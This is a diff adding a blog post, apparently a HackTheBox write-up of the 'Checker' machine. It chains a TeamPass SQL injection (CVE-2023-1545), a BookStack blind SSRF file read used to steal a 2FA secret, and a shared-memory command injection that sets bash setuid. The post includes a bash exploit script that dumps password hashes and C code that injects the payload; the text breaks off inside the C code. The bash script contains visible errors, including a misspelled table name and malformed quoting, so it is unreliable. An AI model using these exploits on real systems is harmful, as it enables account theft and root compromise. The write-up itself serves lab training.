@@ -1,0 +1,551 @@
+<!DOCTYPE html>
+<html class="direction--ltr"lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Checker 1eab952552918014a431c736eae89e54 | Pwn3d777</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="Checker 1eab952552918014a431c736eae89e54" />
+<meta name="author" content="GitHub User" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Checker" />
+<meta property="og:description" content="Checker" />
+<link rel="canonical" href="https://your-site-url/writeups/2025/07/17/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e.html" />
+<meta property="og:url" content="https://your-site-url/writeups/2025/07/17/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e.html" />
+<meta property="og:site_name" content="Pwn3d777" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2025-07-17T16:05:57+00:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Checker 1eab952552918014a431c736eae89e54" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"GitHub User"},"dateModified":"2025-07-17T16:05:57+00:00","datePublished":"2025-07-17T16:05:57+00:00","description":"Checker","headline":"Checker 1eab952552918014a431c736eae89e54","mainEntityOfPage":{"@type":"WebPage","@id":"https://your-site-url/writeups/2025/07/17/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e.html"},"url":"https://your-site-url/writeups/2025/07/17/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="icon" type="image/png" href="/assets/favicon.png" />
+  <link rel="stylesheet" href="/assets/css/magnific-popup.css"><link type="application/atom+xml" rel="alternate" href="https://your-site-url/feed.xml" title="Pwn3d777" /><script src="https://code.jquery.com/jquery-3.2.0.min.js"></script> 
+  <script src="/assets/js/jquery.magnific-popup.js"></script>
+</head>
+<body><div class="site-header">
+  <div class="wrapper">
+    <a class="site-title" rel="author" href="/">Pwn3d777<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
+    <span class="social_links">
+        
+        
+        <a class="color-cyan-hover" href="https://twitter.com/bitbrain_"><i class="fab fa-twitter-square"></i></a>
+        
+        
+        
+        <a class="color-red-hover" href="https://bitbrain.itch.io"><i class="fab fa-itch-io"></i></a>
+        
+        
+        
+        <a class="color-purple-hover" href="https://github.com/bitbrain"><i class="fab fa-github-square"></i></a>
+        
+        
+    </span>
+  </div>
+</div>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        
+  <div class="author-box">
+
+<div class="description">This is my blog, here you will find more information about me, in addition to my work on HackTheBox and some interesting apps i've developed
+</div>
+
+</div>
+
+
+<div class="post">
+  <h1 class="post-title">Checker 1eab952552918014a431c736eae89e54</h1>
+  
+  <div class="post-date">
+    Published on 17 Jul 2025
+    
+  </div>
+  
+  <h1 id="checker">Checker</h1>
+
+<h1 id="1-enumeration">1. Enumeration</h1>
+
+<p>As always we start with nmap, there are three ports open</p>
+
+<p><img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image.png" alt="image.png" /></p>
+
+<p>In port 80 there is a bookstack login, default credentials do not work, we cannot register a new user</p>
+
+<p><img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_1.png" alt="image.png" /></p>
+
+<p>We also can reset passwords</p>
+
+<p><img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_2.png" alt="image.png" /></p>
+
+<p>TeamPass service is running on port 8080</p>
+
+<p><img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_3.png" alt="image.png" /></p>
+
+<p>Search a little bit to find a vulnerability</p>
+
+<p><img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_4.png" alt="image.png" /></p>
+
+<p>We don’t have any teampass version disclosed, but a poc of CVE-2023-1545 is present in here and we don’t lose anything if we try</p>
+
+<p><img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_5.png" alt="image.png" /></p>
+
+<p>It is performing a sql injection giving it a new fake file that is not saved in the database but is compiled with the purpose of spoof the list of valid users, making a login as admin with a lure hash, extracting all users directly from the database.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#Check number of arguments</span>
+<span class="k">if</span> <span class="o">[</span> <span class="s2">"$#"</span> <span class="nt">-lt</span> 1]<span class="p">;</span> <span class="k">then</span>
+	<span class="c">#Output the name of the script</span>
+	<span class="nb">echo</span> <span class="s2">"Usage: </span><span class="nv">$0</span><span class="s2"> &lt;base-url&gt;"</span> 
+	<span class="nb">exit </span>1
+<span class="k">fi</span>
+
+<span class="c">#Set vulnerable endpoint</span>
+<span class="nv">vulnerable_url</span><span class="o">=</span><span class="s2">"</span><span class="nv">$1</span><span class="s2">/api/index.php/authorize"</span>
+
+<span class="c">#Check if the api is enabled</span>
+<span class="nv">check</span><span class="o">=</span><span class="si">$(</span>curl <span class="nt">--silent</span> <span class="s2">"</span><span class="nv">$vulnerable_url</span><span class="s2">"</span><span class="si">)</span>
+<span class="k">if </span><span class="nb">echo</span> <span class="s2">"</span><span class="nv">$check</span><span class="s2">"</span> | <span class="nb">grep</span> <span class="nt">-q</span> <span class="s2">"API usage is not allowed"</span><span class="p">;</span> <span class="k">then
+	</span><span class="nb">echo</span> <span class="s2">"API feature no enabled, not vulnerable"</span>
+	<span class="nb">exit </span>1
+<span class="k">fi</span>
+
+<span class="c">#Define a random bcrypt hash to act as lure</span>
+<span class="c">#htpasswd -bnBC 10 "" pwned | tr -d ':\n'</span>
+<span class="nv">random_hash</span><span class="o">=</span><span class="s1">'randomhash'</span>
+
+exec_sql<span class="o">()</span> <span class="o">{</span>
+	<span class="c">#SELECT * FROM invitados WHERE nombre = 'none'</span>
+	<span class="c">#UNION</span>
+	<span class="c">#SELECT this is admin info FROM users WHERE login='admin'</span>
+	<span class="nv">inject</span><span class="o">=</span><span class="s2">"none' UNION SELECT id, '</span><span class="nv">$random_hash</span><span class="s2">', (</span><span class="nv">$1</span><span class="s2">), private_key, personal_folder, fonction_id, groupes_interdits, 'foo' FROM temapass_users WHERE login='admin'"</span>
+	<span class="nv">data</span><span class="o">=</span><span class="s2">"{</span><span class="se">\"</span><span class="s2">login</span><span class="se">\"</span><span class="s2">:</span><span class="se">\"</span><span class="s2">"</span><span class="nv">$inject</span><span class="se">\"</span><span class="s2">",</span><span class="se">\"</span><span class="s2">password</span><span class="se">\"</span><span class="s2">:</span><span class="se">\"</span><span class="s2">newpass</span><span class="se">\"</span><span class="s2">,</span><span class="se">\"</span><span class="s2">apikey</span><span class="se">\"</span><span class="s2">:</span><span class="se">\"</span><span class="s2">foo</span><span class="se">\"</span><span class="s2">}"</span>
+	<span class="nv">token</span><span class="o">=</span><span class="si">$(</span>curl <span class="nt">--silent</span> <span class="nt">--header</span> <span class="s2">"Content-Type: application/json"</span> <span class="nt">-X</span> POST <span class="nt">--data</span> <span class="s2">"</span><span class="nv">$data</span><span class="s2">"</span> <span class="s2">"</span><span class="nv">$vulnerable_url</span><span class="s2"> | jq -r '.token'"</span><span class="si">)</span>
+<span class="o">}</span>
+
+<span class="c">#$Change $1 with the query replaced with public key</span>
+<span class="nb">users</span><span class="o">=</span><span class="si">$(</span>exec_sql <span class="s2">"SELECT COUNT(*) FROM teampass_users WHERE pw != ''"</span><span class="si">)</span>
+
+<span class="nb">echo</span> <span class="s2">"There are </span><span class="nv">$users</span><span class="s2"> users in the system:"</span>
+
+<span class="k">for </span>i <span class="k">in</span> <span class="sb">`</span><span class="nb">seq </span>0 <span class="k">$((</span><span class="nv">$users</span><span class="o">-</span><span class="m">1</span><span class="k">))</span><span class="sb">`</span><span class="p">;</span> <span class="k">do
+	</span><span class="nv">username</span><span class="o">=</span><span class="si">$(</span>exec_sql <span class="s2">"SELECT login FROM teampass_users WHERE pw != ORDER BY login ASC LIMIT </span><span class="nv">$i</span><span class="s2">,1"</span><span class="si">)</span>
+	<span class="nv">password</span><span class="o">=</span><span class="si">$(</span>exec_sql <span class="s2">"SELECT pw FROM teampass_users WHERE pw != '' ORDER BY login ASC LIMIT </span><span class="nv">$i</span><span class="s2">,1"</span><span class="si">)</span>
+	<span class="nb">echo</span> <span class="s2">"</span><span class="nv">$username</span><span class="s2">:</span><span class="nv">$password</span><span class="s2">"</span>
+<span class="k">done</span>
+</code></pre></div></div>
+
+<p><img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_6.png" alt="image.png" /></p>
+
+<h1 id="2-user-flag">2. User flag</h1>
+
+<p>Once we have admin user, we can crack it with john</p>
+
+<p><img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_7.png" alt="image.png" /></p>
+
+<p>In team pass dashboard there are more bob’s passwords</p>
+
+<p><img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_8.png" alt="image.png" /></p>
+
+<p>This seems interesting, let’s try to login in ssh</p>
+
+<p><img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_9.png" alt="image.png" /></p>
+
+<p>It has 2FA and we need a verification code</p>
+
+<p><img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_10.png" alt="image.png" /></p>
+
+<p>Stand a little and check port 80 where is the bookstack framework and we have access thanks to the previous findings, we can create books on it</p>
+
+<p><img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_11.png" alt="image.png" /></p>
+
+<p>In the source code the version is disclosed</p>
+
+<p><img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_12.png" alt="image.png" /></p>
+
+<p>It seems to be vulnerable to CVE-2023-6199 Local File Reading via Blind Server Side Request Forgery</p>
+
+<p><img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_13.png" alt="image.png" /></p>
+
+<p><img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_14.png" alt="image.png" /></p>
+
+<p>The attacker must have writer permissions. As we saw before bob can create and delete books</p>
+
+<p><img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_15.png" alt="image.png" /></p>
+
+<p><img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_16.png" alt="image.png" /></p>
+
+<p>Searching around internet there is a way to enable 2FA through ssh via google-authenticator</p>
+
+<p><img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_17.png" alt="image.png" /></p>
+
+<p>It says a secret necessary for the verification code is in ~/google-authenticator. We may try to generate our own verification code through this secret</p>
+
+<p><img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_18.png" alt="image.png" /></p>
+
+<p><code class="language-plaintext highlighter-rouge">/ajax/page/&lt;id&gt;/save-draft</code> could be the endpoint for expose the file we need</p>
+
+<p><img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_19.png" alt="image.png" /></p>
+
+<p>It’s time to find a PoC of concept to perform this attack.</p>
+
+<p>According with this blog post, we can use php_filter_chains_oracle_exploit to abuse this vulnerability.</p>
+
+<p>https://fluidattacks.com/es/blog/lfr-via-blind-ssrf-book-stack</p>
+
+<p>Basically this version of bookstack is using intervention image library which handles with images, it is taking all images that are present in the html source, uploading them to the server and converting the source to an url</p>
+
+<p><img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_20.png" alt="image.png" /></p>
+
+<p>Then it is getting the file extension and storing the image into a repo and the url is returned</p>
+
+<p><img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_21.png" alt="image.png" /></p>
+
+<p>If we get deeper understanding of how it is uploading the image we might be able to trick the server to disclose information</p>
+
+<p><img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_22.png" alt="image.png" /></p>
+
+<p>The function make can take a url, a path or a binary like it is usually here</p>
+
+<p><img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_23.png" alt="image.png" /></p>
+
+<p>Driver in charge to init the image is sending a GET request to the given url to load the image, we have full control over this url</p>
+
+<p><img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_24.png" alt="image.png" /></p>
+
+<p>There is a method to use a <code class="language-plaintext highlighter-rouge">php://</code> wrapper to filter contents we can learn more of this here:</p>
+
+<p>https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle</p>
+
+<p>Now it is time to exploit this, capture the request performed by the following endpoint</p>
+
+<p><code class="language-plaintext highlighter-rouge">/BookStack/public/ajax/page/7/save-draft</code></p>
+
+<p><img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_25.png" alt="image.png" /></p>
+
+<p>Get the authorization cookies needed for this</p>
+
+<p><img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_26.png" alt="image.png" /></p>
+
+<p><img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_27.png" alt="image.png" /></p>
+
+<p>Use the next exploit setting necessary flags using <code class="language-plaintext highlighter-rouge">/etc/passwd</code> as a test file to see that it is working properly, we can use the proxy to have more control over what is happening</p>
+
+<p><a href="https://github.com/synacktiv/php_filter_chains_oracle_exploit">https://github.com/synacktiv/php_filter_chains_oracle_exploit</a></p>
+
+<p><img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_28.png" alt="image.png" /></p>
+
+<p>Forward all requests</p>
+
+<p><img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_29.png" alt="image.png" /></p>
+
+<p>Now that we know this is a valid vector attack, we need to find a way to get the OTP secret, in a book created previously for bob there are clues for the home directory</p>
+
+<p><img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_30.png" alt="image.png" /></p>
+
+<p>connect the dots and access the <code class="language-plaintext highlighter-rouge">.google_authenticator</code> file with the secret</p>
+
+<p><img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_31.png" alt="image.png" /></p>
+
+<p><img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_32.png" alt="image.png" /></p>
+
+<p><img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_33.png" alt="image.png" /></p>
+
+<p>Now use TOTP web application to enter the secret and get the verification code</p>
+
+<p><img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_34.png" alt="image.png" /></p>
+
+<p>That’s how we get the user flag</p>
+
+<p><img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_35.png" alt="image.png" /></p>
+
+<h1 id="3priv-esc">3.Priv esc</h1>
+
+<p>Use <code class="language-plaintext highlighter-rouge">sudo -l</code> to see binaries allowed to run as root</p>
+
+<p><code class="language-plaintext highlighter-rouge">Check-leak.sh</code> is allowed to run as root, it is a custom script that given a username it sanitize the input keeping only alphanumeric characters and use a binary to determine if the username was leaked or not</p>
+
+<p><img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_36.png" alt="image.png" /></p>
+
+<p>Download <code class="language-plaintext highlighter-rouge">cheack_leak</code> binary to inspect it meticulously</p>
+
+<p><img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_37.png" alt="image.png" /></p>
+
+<p>Use FreeIDA software for this task, identify main function</p>
+
+<p><img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_38.png" alt="image.png" /></p>
+
+<p>This function is checking leaked hashes in a file, if the password is leaked open a shared memory location to execute a command querying the information for the hash in the database</p>
+
+<p><img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_39.png" alt="image.png" /></p>
+
+<p>Here we have the <code class="language-plaintext highlighter-rouge">write_to_shm</code> function, we can notice how the address memory is chosen, it takes the current time, initializes the random function taking time as seed, and generates a pseudo-random number between 0-0xFFFFF (1048575). Then it try to access to that memory address and gets a pointer for it. A message is written in this memory address with the time and hash</p>
+
+<p><img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_40.png" alt="image.png" /></p>
+
+<p>This memory location is used for the notify user function</p>
+
+<p><img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_41.png" alt="image.png" /></p>
+
+<p>This function assure the string “Leaked hash detected” is present in this memory address, then the pointer is set to point the message from the ASCII 62 (&gt;)</p>
+
+<p><img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_42.png" alt="image.png" /></p>
+
+<p>Set the pointer after the (&gt;) cut and clean and verify the hash</p>
+
+<p><img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_43.png" alt="image.png" /></p>
+
+<p>With this the mysql query is performed</p>
+
+<p><img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_44.png" alt="image.png" /></p>
+
+<p>Here we have a clear view of what notify user is doing with its key points</p>
+
+<p><img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_45.png" alt="image.png" /></p>
+
+<p>It’s time to use all this information to create a exploit that inject the memory address with the information we want the query to execute, use the same structure to create the seed, verify the memory reservation and access the pointer to inject the message. We can use pure C or C libraries in python</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;time.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;sys/ipc.h&gt;</span><span class="c1"> //Key_t</span><span class="cp">
+#include</span> <span class="cpf">&lt;sys/shm.h&gt;</span><span class="c1"> //sh *</span><span class="cp">
+#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+	<span class="c1">//Get time</span>
+	<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v4</span> <span class="o">=</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">time</span><span class="p">(</span><span class="nb">NULL</span><span class="p">);</span>
+	<span class="c1">//Init randomic function</span>
+	<span class="n">srand</span><span class="p">(</span><span class="n">v4</span><span class="p">);</span>
+	
+	<span class="n">key_t</span> <span class="n">key</span> <span class="o">=</span> <span class="n">rand</span><span class="p">()</span> <span class="o">%</span> <span class="mh">0xFFFFF</span><span class="p">;</span>
+	
+	<span class="c1">//Create shared memory and check</span>
+		<span class="kt">int</span> <span class="n">shmid</span> <span class="o">=</span> <span class="n">shmget</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">,</span> <span class="n">IPC_CREAT</span> <span class="o">|</span> <span class="mo">0666</span><span class="p">);</span>
+	<span class="k">if</span> <span class="p">(</span><span class="n">shmid</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+		<span class="n">perror</span><span class="p">(</span><span class="s">"shmget failed"</span><span class="p">);</span>
+		<span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+	<span class="p">}</span>
+	
+	<span class="c1">// attach shared memory and gets its pointer</span>
+	<span class="kt">char</span> <span class="o">*</span><span class="n">share_memory</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">shmat</span><span class="p">(</span><span class="n">shmid</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+	<span class="k">if</span> <span class="p">(</span><span class="n">share_memory</span> <span class="o">==</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">){</span>
+		<span class="n">perror</span><span class="p">(</span><span class="s">"shmat failed"</span><span class="p">);</span>
+		<span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+	<span class="p">}</span>
+	
+	<span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">message</span> <span class="o">=</span> <span class="s">"Leaked hash detected &gt; '; chmod +s /bin/bash;#"</span><span class="p">;</span>
+	<span class="c1">//Inject memory</span>
+	<span class="n">snprintf</span><span class="p">(</span><span class="n">share_memory</span><span class="p">,</span><span class="mh">0x400</span><span class="p">,</span><span class="s">"%s"</span><span class="p">,</span> <span class="n">message</span><span class="p">);</span>
+	
+	<span class="n">printf</span><span class="p">(</span><span class="s">"Message in shared memory: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">share_memory</span><span class="p">);</span>
+	
+	<span class="c1">//detach shared memory</span>
+	<span class="k">if</span> <span class="p">(</span><span class="n">shmdt</span><span class="p">(</span><span class="n">share_memory</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">){</span>
+		<span class="n">perror</span><span class="p">(</span><span class="s">"shmdt failed"</span><span class="p">);</span>
+		<span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
